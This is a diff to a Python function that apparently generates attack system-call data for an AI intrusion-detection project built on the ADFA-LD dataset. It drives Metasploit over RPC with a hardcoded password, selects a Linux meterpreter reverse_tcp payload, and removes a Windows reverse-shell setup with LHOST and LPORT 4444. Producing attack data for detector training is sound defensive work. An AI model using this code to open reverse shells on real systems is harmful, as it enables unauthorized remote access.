@@ -66,6 +66,9 @@ def get_syscall_from_ssh():
 
 
 def get_syscall_from_Meterpreter():
+    # Dans un terminal load msgrpc [Pass=hugo]
+
+
     client = MsfRpcClient('2GX4jkpm', port=55552)
     payload_name = "linux/x86/meterpreter/reverse_tcp"
     csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
@@ -74,9 +77,6 @@ def get_syscall_from_Meterpreter():
     ip = get_my_ip()
     print('your ip :', ip)
 
-    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-    payload['LHOST'] = ip
-    payload['LPORT'] = 4444
     
     payload = client.modules.use('payload', payload_name)
     
